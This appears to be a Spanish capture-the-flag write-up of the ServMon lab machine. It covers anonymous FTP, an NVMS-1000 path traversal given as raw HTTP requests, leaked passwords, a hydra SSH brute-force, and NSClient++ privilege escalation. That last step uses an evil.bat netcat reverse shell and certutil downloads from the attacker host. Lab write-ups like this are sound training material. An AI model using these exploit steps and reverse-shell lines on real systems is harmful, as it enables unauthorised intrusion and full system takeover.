21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
8443/tcp open http 

-Entramos al puerto ftp con el usuario Anonymous y nos descargamos 2 archivos:
	**-Confidential.txt:** Nathan,
		I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
		Regards
		Nadine
	**-Notes to do.txt:** 
		1) Change the password for NVMS - Complete
		2) Lock down the NSClient Access - Complete
		3) Upload the passwords
		4) Remove public access to NVMS
		5) Place the secret files in SharePoint

-Estos archivos nos servirán más tarde!!

-Visitamos el puerto 80 y nos encontramos el servicio nvms-1000, el cual tiene una vulnerabilidad **'PATH TRAVERSAL'**, buscamos exploit y vemos que se explota así:
	GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
	Host: 10.10.10.184
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
	Accept-Encoding: gzip, deflate
	Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
	Connection: close

-Lo introducimos en el BurpSuite y vemos la salida del archivo 'win.ini':
	for 16-bit app support
	[fonts]
	[extensions]
	[mci extensions]
	[files]
	[Mail]
	MAPI=1 
	(HA FUNCIONADO!!)

-Vamos a listar el archivo **'Passwords.txt'** desde BurpSuite, el cual se encuentra en **/Users/Nathan/Desktop/Passwords.txt** , como vimos en **'Confidential.txt'**
	GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
	Host: 10.10.10.184
		Response:
			1nsp3ctTh3Way2Mars!
			Th3r34r3To0M4nyTrait0r5!
			B3WithM30r4ga1n5tMe
			L1k3B1gBut7s@W0rk
			0nly7h3y0unGWi11F0l10w
			IfH3s4b0Utg0t0H1sH0me
			Gr4etN3w5w17hMySk1Pa5$

-Creamos un archivo users.txt (nathan, nadine) y un passwords.txt con las contraseñas encontradas y hacemos Fuerza Bruta a SSH:
	-hydra ssh://10.10.10.184 -L users.txt -P passwords.txt -V
		[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk

-Entramos a la máquina con las credenciales obtenidas:
	-ssh nadine@10.10.10.184
	-Password: L1k3B1gBut7s@W0rk
		nadine@SERVMON C:\Users\Nadine>whoami
		servmon\nadine

## Escalada de Privilegios

-Recordamos que tenemos el puerto 8443 abierto , con el servicio nsclient++ , buscamos exploits:
	-searchsploit nsclient++
		windows/local/46802.txt
			Exploit:
			1. Grab web administrator password
			- open c:\program files\nsclient++\nsclient.ini
			or
			- run the following that is instructed when you select forget password
			        C:\Program Files\NSClient++>nscp web -- password --display
			        Current password: SoSecret
			
			1. Login and enable following modules including enable at startup and save configuration
			- CheckExternalScripts
			- Scheduler
			
			1. Download nc.exe and evil.bat to c:\temp from attacking machine
			        @echo off
			        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
			
			2. Setup listener on attacking machine
			        nc -nlvvp 443
			
			3. Add script foobar to call evil.bat and save settings
			- Settings > External Scripts > Scripts
			- Add New
			        - foobar
			                command = c:\temp\evil.bat

-Nos vamos a --> C:\Program Files\NSClient++> nsclient.ini
	-Current password: ew2x6SsGTxjRwXOT
	(TENEMOS LA CONTRASEÑA DEL LOGIN!!)

-Entramos a https://10.10.10.184:8443/index.html#/ , pero no encontramos ningún panel de Login (es porque desde Firefox no carga bien). Tenemos que abrir el Chronium.

-Si visitamos la ruta desde Chronium si nos aparece el login, sin embargo el login falla. Esto es porque la app no deja autenticarse a otros hosts.

-Hacemos Local Port Porwarding para que nos deje autenticarnos:
	-ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443

-Creamos un directorio /temp en la máquina, en nuestra máquina nos creamos el archivo evil.bat:
	@echo off
	c:\temp\nc.exe 10.10.14.17 443 -e cmd.exe

-Nos descargamos Netcat para Windows desde aquí:
	https://eternallybored.org/misc/netcat/ (el de 1.12)

-Lo descomprimimos , cambiamos el nombre de '**nc64.exe**' a **nc.exe**:
	-Máquina local: 
		python3 -m http.server 80
	-Máquina víctima:
		-certutil -urlcache -f http://10.10.14.17/nc64.exe nc.exe
		-certutil -urlcache -f http://10.10.14.17/evil.bat evil.bat

-Nos ponemos en escucha en nuestra máquina y hacemos esto:
	Settings > External Scripts > Scripts
		- Add New
			- foobar
				command = c:\temp\evil.bat

-Guardamos los cambios y hacemos reload, despues nos metemos en la pestaña de 'Queries' y recibimos la conexión como el usuario Administrador:
	C:\Users\Administrator\Desktop>whoami
		nt authority\system